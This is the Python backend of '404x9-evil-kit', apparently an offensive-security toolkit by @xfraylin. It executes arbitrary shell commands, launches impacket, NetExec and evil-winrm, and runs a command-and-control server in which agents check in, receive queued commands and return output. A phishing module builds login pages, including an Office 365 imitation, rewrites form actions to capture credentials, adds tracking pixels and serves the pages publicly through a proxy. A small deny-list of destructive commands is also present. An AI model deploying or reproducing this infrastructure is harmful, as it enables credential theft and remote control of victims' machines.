#!/usr/bin/env python3
"""
404x9-evil-kit — Local Backend Server
by @xfraylin
"""

import subprocess
import threading
import queue
import json
import os
import signal
import time
import re
import logging
import uuid
import datetime
import urllib.request
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler
from flask import Flask, render_template, request, jsonify, Response, stream_with_context
from flask_cors import CORS
from modules.netexec_panel import (
    build_evil_winrm_launcher,
    build_netexec_command,
    discover_modules,
    parse_netexec_output,
)

try:
    from flask_sock import Sock
except Exception:
    Sock = None

# ── Silence Flask/Werkzeug access logs, keep errors ──────────────────────────
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
CORS(app)
sock = Sock(app) if Sock else None

active_procs = {}
proc_lock    = threading.Lock()
job_queues   = {}

# ── Impacket path resolver ────────────────────────────────────────────────────
IMPACKET_SEARCH_PATHS = [
    '/usr/bin', '/usr/local/bin', '/usr/share/doc/python3-impacket/examples',
    '/usr/share/impacket/scripts', '/opt/impacket/examples',
]
IMPACKET_TOOLS = ['psexec.py','wmiexec.py','smbexec.py','atexec.py',
                  'secretsdump.py','GetUserSPNs.py','GetNPUsers.py',
                  'ntlmrelayx.py','lookupsid.py','samrdump.py',
                  'dacledit.py','owneredit.py','getTGT.py','getST.py',
                  'ticketer.py','dcomexec.py']

def resolve_impacket(script):
    """Return absolute path for an impacket script or None."""
    # 1. Check PATH via which
    r = subprocess.run(['which', script], capture_output=True, text=True, timeout=3)
    if r.returncode == 0:
        return r.stdout.strip()
    # 2. Fallback to known dirs
    for d in IMPACKET_SEARCH_PATHS:
        p = os.path.join(d, script)
        if os.path.isfile(p):
            return p
    return None

_impacket_cache = {}
def get_impacket(script):
    if script not in _impacket_cache:
        _impacket_cache[script] = resolve_impacket(script)
    return _impacket_cache[script]

# ── JOHN format mapper ────────────────────────────────────────────────────────
JOHN_FORMAT_MAP = {
    'md5':    'raw-md5',
    'sha1':   'raw-sha1',
    'sha256': 'raw-sha256',
    'sha512': 'raw-sha512',
}
def john_format(fmt):
    return JOHN_FORMAT_MAP.get(fmt.lower(), fmt)

# ── Sanitiser ─────────────────────────────────────────────────────────────────
def sanitize_cmd(cmd):
    BLOCKED = [
        r'\brm\s+-rf\s+/',
        r'\bmkfs\b',
        r'\bdd\s+.*of=/dev/[sh]d',
        r'>\s*/dev/[sh]d',
        r'\bformat\b.*[cC]:\\\\',
    ]
    for pat in BLOCKED:
        if re.search(pat, cmd):
            return False, "Bloqueado: patrón de comando potencialmente destructivo."
    return True, ""

# ── Runner ────────────────────────────────────────────────────────────────────
def run_command(job_id, cmd, cwd=None, env_extra=None):
    q = queue.Queue()
    job_queues[job_id] = q

    def worker():
        env = os.environ.copy()
        env['TERM'] = 'xterm-256color'
        env['FORCE_COLOR'] = '1'
        # Always prepend the venv bin so pip-installed tools (ldeep, adidnsdump,
        # coercer, certipy, etc.) are found even if the server was started
        # without the venv activated.
        _venv_bin = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'venv', 'bin')
        env['PATH'] = _venv_bin + ':' + env.get('PATH', '/usr/local/bin:/usr/bin:/bin')
        if env_extra:
            env.update(env_extra)
        try:
            proc = subprocess.Popen(
                cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                cwd=cwd, env=env, preexec_fn=os.setsid,
                bufsize=1, universal_newlines=True
            )
            with proc_lock:
                active_procs[job_id] = proc
            q.put({'type': 'start', 'pid': proc.pid, 'cmd': cmd})
            for line in iter(proc.stdout.readline, ''):
                q.put({'type': 'output', 'data': line})
            proc.stdout.close()
            proc.wait()
            q.put({'type': 'done', 'code': proc.returncode})
        except Exception as e:
            q.put({'type': 'error', 'data': str(e)})
            q.put({'type': 'done', 'code': -1})
        finally:
            with proc_lock:
                active_procs.pop(job_id, None)

    threading.Thread(target=worker, daemon=True).start()
    return q

# ── Routes ────────────────────────────────────────────────────────────────────
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/run', methods=['POST'])
def api_run():
    data  = request.json or {}
    cmd   = data.get('cmd', '').strip()
    cwd   = data.get('cwd', '/tmp')
    if not cmd:
        return jsonify({'error': 'No command provided'}), 400
    ok, reason = sanitize_cmd(cmd)
    if not ok:
        return jsonify({'error': reason}), 403
    job_id = f"job_{int(time.time()*1000)}_{os.getpid()}"
    run_command(job_id, cmd, cwd=cwd)
    return jsonify({'job_id': job_id})

@app.route('/api/stream/<job_id>')
def api_stream(job_id):
    def generate():
        q = job_queues.get(job_id)
        if not q:
            time.sleep(0.15)
            q = job_queues.get(job_id)
        if not q:
            yield f"data: {json.dumps({'type':'error','data':'Job not found'})}\n\n"
            return
        while True:
            try:
                msg = q.get(timeout=30)
                yield f"data: {json.dumps(msg)}\n\n"
                if msg.get('type') == 'done':
                    job_queues.pop(job_id, None)
                    break
            except queue.Empty:
                yield f"data: {json.dumps({'type':'keepalive'})}\n\n"
    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={'Cache-Control':'no-cache','X-Accel-Buffering':'no'}
    )

@app.route('/api/kill/<job_id>', methods=['POST'])
def api_kill(job_id):
    with proc_lock:
        proc = active_procs.get(job_id)
    if proc:
        try:
            pgid = os.getpgid(proc.pid)
            # SIGTERM first, then SIGKILL to handle sudo'd processes
            try: os.killpg(pgid, signal.SIGTERM)
            except OSError: pass
            time.sleep(0.3)
            try: os.killpg(pgid, signal.SIGKILL)
            except OSError: pass
            # also terminate the proc object itself
            try: proc.terminate()
            except Exception: pass
            try: proc.kill()
            except Exception: pass
            return jsonify({'status': 'killed'})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    return jsonify({'error': 'Process not found'}), 404

@app.route('/api/jobs')
def api_jobs():
    with proc_lock:
        return jsonify({'active': list(active_procs.keys())})

# ── NetExec / NXC backend ────────────────────────────────────────────────────
@app.route('/api/netexec/modules')
def api_netexec_modules():
    refresh = request.args.get('refresh') in ('1', 'true', 'yes')
    return jsonify(discover_modules(refresh=refresh))

@app.route('/api/netexec/build', methods=['POST'])
def api_netexec_build():
    data = request.json or {}
    try:
        cmd, argv = build_netexec_command(data)
        evil = build_evil_winrm_launcher(data) if (data.get('protocol') == 'winrm') else ''
        return jsonify({'ok': True, 'cmd': cmd, 'argv': argv, 'evil_winrm': evil})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 400

@app.route('/api/netexec/run', methods=['POST'])
def api_netexec_run():
    data = request.json or {}
    try:
        cmd, argv = build_netexec_command(data)
    except Exception as e:
        return jsonify({'error': str(e)}), 400
    ok, reason = sanitize_cmd(cmd)
    if not ok:
        return jsonify({'error': reason}), 403
    job_id = f"nxc_{int(time.time()*1000)}_{os.getpid()}"
    run_command(job_id, cmd, cwd=data.get('cwd', '/tmp'))
    return jsonify({'job_id': job_id, 'cmd': cmd, 'argv': argv})

@app.route('/api/netexec/parse', methods=['POST'])
def api_netexec_parse():
    raw = (request.json or {}).get('raw', '')
    try:
        return jsonify({'ok': True, 'parsed': parse_netexec_output(raw)})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

@app.route('/api/netexec/logs/save', methods=['POST'])
def api_netexec_logs_save():
    data = request.json or {}
    raw  = data.get('raw', '')
    path = data.get('path') or f"/tmp/nxc_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    if not os.path.abspath(path).startswith('/tmp/'):
        return jsonify({'error': 'NetExec logs are restricted to /tmp'}), 400
    try:
        with open(path, 'w', encoding='utf-8', errors='replace') as fh:
            fh.write(raw)
            if raw and not raw.endswith('\n'):
                fh.write('\n')
        return jsonify({'ok': True, 'path': path, 'size': os.path.getsize(path)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if sock:
    @sock.route('/api/netexec/ws/<job_id>')
    def api_netexec_ws(ws, job_id):
        q = job_queues.get(job_id)
        if not q:
            time.sleep(0.15)
            q = job_queues.get(job_id)
        if not q:
            ws.send(json.dumps({'type': 'error', 'data': 'Job not found'}))
            return
        while True:
            try:
                msg = q.get(timeout=30)
                ws.send(json.dumps(msg))
                if msg.get('type') == 'done':
                    break
            except queue.Empty:
                ws.send(json.dumps({'type': 'keepalive'}))

# ── Public-service proxy ──────────────────────────────────────────────────────
# Architecture: admin panel stays on :5000 (private).
# Each deployed service gets an isolated proxy on a chosen port (default 8080)
# that only forwards the specific page path and its capture endpoints.
# Tunnels point to the proxy port, never to :5000.
#
# Allowed through proxy:
#   /p/<page_id>          — the deployed phishing page
#   /api/phish/capture    — form/JS payload data collection
#   /api/phish/px/<id>    — pixel tracker
#   /api/phish/land/<id>  — landing tracker
#
# Everything else (admin panel, API routes, other pages) → 403.

_pub_proxies     = {}   # port → {'srv': HTTPServer, 'page_id': str}
_pub_proxy_lock  = threading.Lock()

def _make_proxy_handler(page_id):
    """Return a request handler class locked to a specific page_id."""
    allowed_exact  = ('/api/phish/capture',)
    allowed_prefix = (f'/p/{page_id}', f'/api/phish/px/', f'/api/phish/land/')

    class Handler(BaseHTTPRequestHandler):
        def _allowed(self):
            p = self.path.split('?')[0]
            return p in allowed_exact or any(p.startswith(a) for a in allowed_prefix)

        def _forward(self):
            if not self._allowed():
                self.send_response(403)
                self.send_header('Content-Type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(b'403 Forbidden')
                return
            try:
                length = int(self.headers.get('Content-Length', 0))
                body   = self.rfile.read(length) if length > 0 else None
                skip_req = {'host', 'connection', 'transfer-encoding'}
                hdrs  = {k: v for k, v in self.headers.items()
                         if k.lower() not in skip_req}
                req = urllib.request.Request(
                    f'http://127.0.0.1:5000{self.path}',
                    data=body, headers=hdrs, method=self.command
                )
                with urllib.request.urlopen(req, timeout=30) as resp:
                    self.send_response(resp.status)
                    skip_resp = {'transfer-encoding', 'connection'}
                    for k, v in resp.headers.items():
                        if k.lower() not in skip_resp:
                            self.send_header(k, v)
                    self.end_headers()
                    self.wfile.write(resp.read())
            except urllib.error.HTTPError as e:
                self.send_response(e.code)
                self.end_headers()
                try: self.wfile.write(e.read())
                except: pass
            except Exception as ex:
                self.send_response(502)
                self.end_headers()
                self.wfile.write(f'Proxy error: {ex}'.encode())

        do_GET = do_POST = _forward
        def log_message(self, *a): pass

    return Handler

@app.route('/api/public/start', methods=['POST'])
def api_public_start():
    data    = request.json or {}
    port    = int(data.get('port', 8080))
    page_id = data.get('page_id', '')
    with _pub_proxy_lock:
        # Stop existing proxy on this port if any
        existing = _pub_proxies.get(port)
        if existing:
            existing['srv'].shutdown()
            del _pub_proxies[port]
        if not page_id:
            return jsonify({'error': 'page_id required'}), 400
        try:
            handler = _make_proxy_handler(page_id)
            srv = HTTPServer(('0.0.0.0', port), handler)
            _pub_proxies[port] = {'srv': srv, 'page_id': page_id}
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            return jsonify({'ok': True, 'port': port, 'page_id': page_id})
        except Exception as e:
            return jsonify({'error': str(e)}), 500

@app.route('/api/public/stop', methods=['POST'])
def api_public_stop():
    data = request.json or {}
    port = data.get('port')
    with _pub_proxy_lock:
        if port:
            entry = _pub_proxies.pop(int(port), None)
            if entry: entry['srv'].shutdown()
        else:
            # Stop all
            for entry in list(_pub_proxies.values()):
                entry['srv'].shutdown()
            _pub_proxies.clear()
    return jsonify({'ok': True})

@app.route('/api/public/status')
def api_public_status():
    with _pub_proxy_lock:
        services = [{'port': p, 'page_id': v['page_id']}
                    for p, v in _pub_proxies.items()]
    return jsonify({'running': len(services) > 0, 'services': services})

@app.route('/api/is_root')
def api_is_root():
    return jsonify({'root': os.getuid() == 0})

@app.route('/api/check', methods=['POST'])
def api_check():
    tool = (request.json or {}).get('tool', '').split()[0]
    try:
        r = subprocess.run(['which', tool], capture_output=True, text=True, timeout=3)
        found = r.returncode == 0
        return jsonify({'tool': tool, 'found': found, 'path': r.stdout.strip() if found else ''})
    except Exception as e:
        return jsonify({'tool': tool, 'found': False, 'error': str(e)})

@app.route('/api/adcs/check', methods=['GET'])
def api_adcs_check():
    """Check certipy-ad installation and return version."""
    import re as _re
    which_r = subprocess.run(['which', 'certipy'], capture_output=True, text=True, timeout=3)
    found   = which_r.returncode == 0
    version = None
    if found:
        pip_r = subprocess.run(['pip3', 'show', 'certipy-ad'],
                               capture_output=True, text=True, timeout=5)
        if pip_r.returncode == 0:
            m = _re.search(r'Version:\s*(\S+)', pip_r.stdout)
            version = m.group(1) if m else None
    return jsonify({'found': found, 'version': version,
                    'path': which_r.stdout.strip() if found else ''})

@app.route('/api/resolve/impacket', methods=['POST'])
def api_resolve_impacket():
    """Resolve real paths for impacket scripts."""
    scripts = (request.json or {}).get('scripts', IMPACKET_TOOLS)
    result  = {}
    for s in scripts:
        p = get_impacket(s)
        result[s] = {'path': p, 'found': p is not None}
    return jsonify(result)

@app.route('/api/john/format', methods=['POST'])
def api_john_format():
    fmt = (request.json or {}).get('format', '')
    return jsonify({'mapped': john_format(fmt)})

@app.route('/api/validate/file', methods=['POST'])
def api_validate_file():
    path = (request.json or {}).get('path', '')
    exists = os.path.isfile(path)
    return jsonify({'path': path, 'exists': exists,
                    'size': os.path.getsize(path) if exists else 0})

@app.route('/api/read/file', methods=['POST'])
def api_read_file():
    """Read a local text file (max 4 MB). Used to load certipy JSON output."""
    data     = request.json or {}
    path     = data.get('path', '')
    max_size = 4 * 1024 * 1024
    if not path or '..' in path or not path.startswith('/'):
        return jsonify({'error': 'Invalid path'}), 400
    try:
        if not os.path.isfile(path):
            return jsonify({'error': 'not_found'}), 404
        size = os.path.getsize(path)
        if size > max_size:
            return jsonify({'error': f'too_large ({size} bytes)'}), 413
        with open(path, 'r', encoding='utf-8', errors='replace') as fh:
            content = fh.read()
        return jsonify({'path': path, 'content': content, 'size': size})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/tools/find-script', methods=['POST'])
def api_find_script():
    """Search for a script file inside a directory tree (post-install path discovery)."""
    data      = request.json or {}
    directory = data.get('directory', '')
    name      = data.get('name', '')
    if not name or not directory or '..' in directory or not directory.startswith('/'):
        return jsonify({'found': False, 'path': '', 'all': []})
    try:
        r = subprocess.run(
            ['find', directory, '-maxdepth', '4', '-name', name, '-type', 'f'],
            capture_output=True, text=True, timeout=5
        )
        paths = [p.strip() for p in r.stdout.strip().split('\n') if p.strip()]
        return jsonify({'found': bool(paths), 'path': paths[0] if paths else '', 'all': paths})
    except Exception as e:
        return jsonify({'found': False, 'path': '', 'error': str(e)})

@app.route('/api/tools/status')
def api_tools_status():
    tools = [
        'nmap','gobuster','ffuf','sqlmap','hydra','john','hashcat',
        'msfvenom','msfconsole','searchsploit','wpscan','nikto',
        'subfinder','amass','whatweb','wafw00f','curl','wget',
        'crackmapexec','netexec','nxc','smbmap','smbclient','rpcclient',
        'enum4linux-ng','ldapdomaindump','ldapsearch',
        'kerbrute','bloodhound-python','responder','mitm6',
        'airmon-ng','airodump-ng','aireplay-ng','aircrack-ng',
        'impacket-psexec','evil-winrm','hashid','tcpdump',
        'medusa','wfuzz','dalfox','httpx','theharvester',
        'sherlock','holehe','dnsrecon','exiftool',
        'katana','nuclei',
        'certipy','bloodyad','pywhisker','coercer',
        'adidnsdump','windapsearch','ldeep',
    ]
    status = {}
    for t in tools:
        r = subprocess.run(['which', t], capture_output=True, text=True, timeout=2)
        status[t] = r.returncode == 0
    # also resolve impacket scripts
    for s in IMPACKET_TOOLS:
        status[s] = get_impacket(s) is not None
    return jsonify(status)

@app.route('/api/files/list')
def api_files_list():
    dirs = ['/tmp', os.path.expanduser('~'), '/root']
    result = {}
    for d in dirs:
        if not os.path.isdir(d):
            continue
        try:
            files = []
            for f in sorted(os.listdir(d)):
                fp   = os.path.join(d, f)
                stat = os.stat(fp)
                files.append({'name': f, 'path': fp, 'size': stat.st_size,
                               'is_dir': os.path.isdir(fp)})
            result[d] = files
        except PermissionError:
            result[d] = []
    return jsonify(result)

@app.route('/api/files/browse')
def api_files_browse():
    path = request.args.get('path', '/usr/share/wordlists')
    if not os.path.isdir(path):
        return jsonify({'error': 'No es un directorio'}), 400
    try:
        entries = []
        for name in sorted(os.listdir(path)):
            fp = os.path.join(path, name)
            try:
                st = os.stat(fp)
                entries.append({
                    'name': name,
                    'path': fp,
                    'is_dir': os.path.isdir(fp),
                    'size': st.st_size
                })
            except OSError:
                pass
        return jsonify({'path': path, 'entries': entries})
    except PermissionError:
        return jsonify({'error': 'Permiso denegado'}), 403

@app.route('/api/files/read')
def api_files_read():
    path = request.args.get('path', '')
    if not path or not os.path.isfile(path):
        return jsonify({'error': 'Archivo no encontrado'}), 404
    try:
        with open(path, 'r', errors='replace') as f:
            content = f.read(500_000)
        return jsonify({'path': path, 'content': content})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/httpx/init', methods=['POST'])
def api_httpx_init():
    path    = (request.json or {}).get('path', '/tmp/httpx.txt')
    out_dir = os.path.dirname(os.path.abspath(path)) or '/tmp'
    for name in ('httpx-live.txt', 'httpx-200.txt', 'httpx-403.txt', 'httpx-30x.txt'):
        open(os.path.join(out_dir, name), 'w').close()
    return jsonify({'ok': True, 'dir': out_dir})

@app.route('/api/httpx/append', methods=['POST'])
def api_httpx_append():
    data    = request.json or {}
    out_dir = data.get('dir', '/tmp')
    mapping = {
        'httpx-live.txt': data.get('live',      []),
        'httpx-200.txt':  data.get('ok',        []),
        'httpx-403.txt':  data.get('forbidden', []),
        'httpx-30x.txt':  data.get('redirects', []),
    }
    for name, urls in mapping.items():
        if not urls:
            continue
        fpath = os.path.join(out_dir, name)
        try:
            with open(fpath, 'r', errors='replace') as f:
                existing = {l.strip() for l in f if l.strip()}
        except FileNotFoundError:
            existing = set()
        new_urls = [u for u in urls if u not in existing]
        if new_urls:
            with open(fpath, 'a') as f:
                f.write('\n'.join(new_urls) + '\n')
    return jsonify({'ok': True})

@app.route('/api/httpx/parse', methods=['POST'])
def api_httpx_parse():
    path = (request.json or {}).get('path', '/tmp/httpx.txt')
    if not os.path.isfile(path):
        return jsonify({'error': 'Archivo no encontrado: ' + path}), 404
    try:
        with open(path, 'r', errors='replace') as f:
            lines = [l.strip() for l in f if l.strip()]

        ok, forbidden, redirects, other = [], [], [], []
        seen = set()
        for line in lines:
            m = re.match(r'^(https?://\S+)', line)
            if not m:
                continue
            url = m.group(1).rstrip(',;')
            if url in seen:
                continue
            seen.add(url)
            # Extract all codes from bracket groups: [200], [301,200], [301,302,200]
            groups = re.findall(r'\[(\d{3}(?:,\d{3})*)\]', line)
            if not groups:
                continue
            codes = [int(c) for g in groups for c in g.split(',')]
            has_3xx = any(300 <= c < 400 for c in codes)
            last    = codes[-1]
            if has_3xx:
                redirects.append(url)
            elif last == 200:
                ok.append(url)
            elif last == 403:
                forbidden.append(url)
            elif last > 0:
                other.append(url)

        all_live = ok + forbidden + redirects + other
        out_dir  = os.path.dirname(path)

        files = {
            os.path.join(out_dir, 'httpx-live.txt'): all_live,
            os.path.join(out_dir, 'httpx-200.txt'):  ok,
            os.path.join(out_dir, 'httpx-403.txt'):  forbidden,
            os.path.join(out_dir, 'httpx-30x.txt'):  redirects,
        }
        for fpath, urls in files.items():
            with open(fpath, 'w') as f:
                f.write('\n'.join(urls) + ('\n' if urls else ''))

        return jsonify({
            'ok':    True,
            'total': len(all_live),
            'counts': {'200': len(ok), '403': len(forbidden),
                       '30x': len(redirects), 'other': len(other)},
            'files': {
                'live': os.path.join(out_dir, 'httpx-live.txt'),
                '200':  os.path.join(out_dir, 'httpx-200.txt'),
                '403':  os.path.join(out_dir, 'httpx-403.txt'),
                '30x':  os.path.join(out_dir, 'httpx-30x.txt'),
            },
            'samples': {'200': ok[:3], '403': forbidden[:3], '30x': redirects[:3]},
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/subs/save', methods=['POST'])
def api_subs_save():
    data = request.json or {}
    raw  = data.get('text', '')
    path = data.get('path', '/tmp/subs.txt')
    lines = [l.strip() for l in raw.splitlines()]
    lines = [l for l in lines if l and not l.startswith('#')]
    seen = set(); deduped = []
    for l in lines:
        if l not in seen:
            seen.add(l); deduped.append(l)
    try:
        with open(path, 'w') as f:
            f.write('\n'.join(deduped) + ('\n' if deduped else ''))
        return jsonify({'ok': True, 'count': len(deduped), 'path': path})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/subs/load', methods=['POST'])
def api_subs_load():
    path = (request.json or {}).get('path', '')
    if not path or not os.path.isfile(path):
        return jsonify({'error': 'Archivo no encontrado'}), 404
    try:
        with open(path, 'r', errors='replace') as f:
            content = f.read(2_000_000)
        lines = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith('#')]
        seen = set(); deduped = []
        for l in lines:
            if l not in seen:
                seen.add(l); deduped.append(l)
        return jsonify({'ok': True, 'count': len(deduped), 'lines': deduped})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/interfaces')
def api_interfaces():
    try:
        r = subprocess.run(['ip', '-o', 'link', 'show'],
                           capture_output=True, text=True, timeout=5)
        ifaces = re.findall(r'^\d+:\s+(\S+):', r.stdout, re.MULTILINE)
        ifaces = [i.rstrip(':') for i in ifaces if i not in ('lo',)]
        return jsonify({'interfaces': ifaces})
    except Exception as e:
        return jsonify({'interfaces': ['eth0', 'wlan0'], 'error': str(e)})

# ═══════════════════════════════════════════════════════════════════════════════
# ── SPYWARE MODULE — C2 + Phishing ──────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

# ── C2 Session Store ──────────────────────────────────────────────────────────
c2_sessions = {}   # session_id -> session dict
c2_lock     = threading.Lock()

@app.route('/api/c2/checkin', methods=['POST'])
def c2_checkin():
    """Agent HTTP check-in. Returns next queued command (if any)."""
    data    = request.json or {}
    sid     = data.get('id') or uuid.uuid4().hex[:8]
    now_str = datetime.datetime.now().isoformat()
    with c2_lock:
        if sid not in c2_sessions:
            c2_sessions[sid] = {
                'id':         sid,
                'hostname':   data.get('hostname', 'unknown'),
                'ip':         request.remote_addr,
                'os':         data.get('os', 'unknown'),
                'user':       data.get('user', 'unknown'),
                'first_seen': now_str,
                'last_seen':  now_str,
                'cmd_queue':  [],
                'results':    [],
            }
        else:
            c2_sessions[sid]['last_seen'] = now_str
            c2_sessions[sid]['ip']        = request.remote_addr
        cmd = None
        if c2_sessions[sid]['cmd_queue']:
            cmd = c2_sessions[sid]['cmd_queue'].pop(0)
    return jsonify({'cmd': cmd, 'session_id': sid})

@app.route('/api/c2/result', methods=['POST'])
def c2_result():
    """Agent posts command output."""
    data = request.json or {}
    sid  = data.get('session_id', '')
    with c2_lock:
        if sid in c2_sessions:
            c2_sessions[sid]['results'].append({
                'cmd':    data.get('cmd', ''),
                'output': data.get('output', ''),
                'ts':     datetime.datetime.now().isoformat(),
            })
            # Keep only last 100 results per session
            c2_sessions[sid]['results'] = c2_sessions[sid]['results'][-100:]
    return jsonify({'ok': True})

@app.route('/api/c2/sessions')
def c2_sessions_api():
    """List all sessions with alive status."""
    now = datetime.datetime.now()
    with c2_lock:
        result = []
        for s in c2_sessions.values():
            ls    = datetime.datetime.fromisoformat(s['last_seen'])
            alive = (now - ls).total_seconds() < 90
            result.append({
                'id':          s['id'],
                'hostname':    s['hostname'],
                'ip':          s['ip'],
                'os':          s['os'],
                'user':        s['user'],
                'first_seen':  s['first_seen'],
                'last_seen':   s['last_seen'],
                'alive':       alive,
                'pending_cmds': len(s['cmd_queue']),
                'results':     s['results'],
            })
    return jsonify({'sessions': result})

@app.route('/api/c2/cmd/<session_id>', methods=['POST'])
def c2_send_cmd(session_id):
    """Queue a command for a session."""
    data = request.json or {}
    cmd  = data.get('cmd', '').strip()
    if not cmd:
        return jsonify({'error': 'No command'}), 400
    ok, reason = sanitize_cmd(cmd)
    if not ok:
        return jsonify({'error': reason}), 403
    with c2_lock:
        if session_id not in c2_sessions:
            return jsonify({'error': 'Session not found'}), 404
        c2_sessions[session_id]['cmd_queue'].append(cmd)
    return jsonify({'ok': True})

@app.route('/api/c2/kill/<session_id>', methods=['POST'])
def c2_kill_session(session_id):
    """Remove a session."""
    with c2_lock:
        c2_sessions.pop(session_id, None)
    return jsonify({'ok': True})

@app.route('/api/c2/clear_results/<session_id>', methods=['POST'])
def c2_clear_results(session_id):
    """Clear result history for a session."""
    with c2_lock:
        if session_id in c2_sessions:
            c2_sessions[session_id]['results'] = []
    return jsonify({'ok': True})

# ═══════════════════════════════════════════════════════════════════════════════
# ── PERSISTENCE ─────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════
_DATA_DIR  = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
_DATA_FILE = os.path.join(_DATA_DIR, 'state.json')
os.makedirs(_DATA_DIR, exist_ok=True)
_save_lock = threading.Lock()

# Telegram config declared here so _save_state can reference it
_tg_config = {'enabled': False, 'token': '', 'chat_id': ''}
_tg_lock   = threading.Lock()

def _load_state():
    """Load persisted state from data/state.json at startup."""
    if not os.path.isfile(_DATA_FILE):
        return {}
    try:
        with open(_DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        print('[state] load error:', e)
        return {}

def _save_state():
    """Persist mutable state to data/state.json (called after every mutation)."""
    try:
        snapshot = {}
        with phish_lock:
            snapshot['phish_creds'] = list(phish_creds)
        with camp_lock:
            snapshot['campaigns'] = {k: v for k, v in campaigns.items()}
        with track_lock:
            snapshot['phish_tracking'] = dict(phish_tracking)
        with clone_lock:
            snapshot['cloned_sites'] = {k: {ck: cv for ck, cv in v.items() if ck != 'html'}
                                         for k, v in cloned_sites.items()}
        with deploy_lock:
            snapshot['deployed_pages'] = {k: {dk: dv for dk, dv in v.items() if dk != 'html'}
                                           for k, v in deployed_pages.items()}
        with _tg_lock:
            snapshot['tg_config'] = dict(_tg_config)
        with _save_lock:
            tmp = _DATA_FILE + '.tmp'
            with open(tmp, 'w', encoding='utf-8') as f:
                json.dump(snapshot, f, indent=2, default=str)
            os.replace(tmp, _DATA_FILE)
    except Exception as e:
        print('[state] save error:', e)

# ═══════════════════════════════════════════════════════════════════════════════
# ── PHISHING CAMPAIGN SYSTEM ────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════
phish_creds    = []
phish_lock     = threading.Lock()
campaigns      = {}          # cid  -> campaign dict
camp_lock      = threading.Lock()
phish_tracking = {}          # track_id -> tracking dict
track_lock     = threading.Lock()
cloned_sites   = {}          # clone_id -> {html, url, ...}
clone_lock     = threading.Lock()
deployed_pages = {}          # page_id  -> {html, name, active, created_at, hits}
deploy_lock    = threading.Lock()
_camp_logs     = []          # rolling log (max 500)
clog_lock      = threading.Lock()

PIXEL_GIF = (
    b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
    b'\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
    b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
)

def _log_phish(msg, level='info'):
    entry = {'ts': datetime.datetime.now().isoformat(), 'msg': msg, 'level': level}
    with clog_lock:
        _camp_logs.append(entry)
        if len(_camp_logs) > 500:
            _camp_logs.pop(0)

def _build_landing(html, track_id, redirect_url):
    """Inject tracking pixel + override form actions in a phishing page."""
    import re as _re
    pixel   = ('<img src="/api/phish/px/' + track_id +
               '" width="1" height="1" style="position:absolute;opacity:0">')
    cap_url = '/api/phish/capture?track_id=' + track_id + '&redirect=' + redirect_url
    html    = _re.sub(r'action\s*=\s*"[^"]*"',
                      'action="' + cap_url + '"', html, flags=_re.IGNORECASE)
    html    = _re.sub(r'action\s*=\s*\'[^\']*\'',
                      "action='" + cap_url + "'", html, flags=_re.IGNORECASE)
    if '</form>' in html and 'action=' not in html:
        html = html.replace('</form>', ' action="' + cap_url + '"></form>', 1)
    html = html.replace('</body>', pixel + '</body>') if '</body>' in html else html + pixel
    return html

PHISH_TEMPLATES = {
    'generic': (
        '<!DOCTYPE html><html><head><title>Login</title>'
        '<style>*{box-sizing:border-box;margin:0;padding:0}'
        'body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}'
        '.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);width:360px}'
        'h2{text-align:center;margin-bottom:20px;color:#333}'
        'input{width:100%;padding:10px;margin:6px 0 14px;border:1px solid #ddd;border-radius:4px;font-size:14px}'
        'button{width:100%;padding:11px;background:#1877f2;color:#fff;border:none;border-radius:4px;font-size:15px;cursor:pointer}'
        'button:hover{background:#166fe5}'
        'p{text-align:center;margin-top:14px;font-size:13px;color:#666}</style>'
        '</head><body><div class="box"><h2>Sign In</h2>'
        '<form method="POST" action="/api/phish/capture">'
        '<input name="username" placeholder="Email or Username" required>'
        '<input name="password" type="password" placeholder="Password" required>'
        '<button type="submit">Sign In</button></form>'
        '<p>Forgot password? <a href="#">Reset</a></p></div></body></html>'
    ),
    'office365': (
        '<!DOCTYPE html><html><head><title>Sign in - Microsoft</title>'
        '<meta name="viewport" content="width=device-width,initial-scale=1">'
        '<style>*{box-sizing:border-box;margin:0;padding:0}'
        'body{font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}'
        '.wrap{width:440px;padding:44px 44px 30px;border:1px solid #ccc;border-radius:2px}'
        '.logo{font-size:22px;font-weight:600;color:#0078d4;margin-bottom:24px}'
        'h1{font-size:24px;font-weight:600;margin-bottom:16px;color:#1b1b1b}'
        'input{width:100%;padding:8px 0;margin-bottom:16px;border:none;border-bottom:1px solid #999;font-size:15px;outline:none;background:transparent}'
        'input:focus{border-bottom:2px solid #0078d4}'
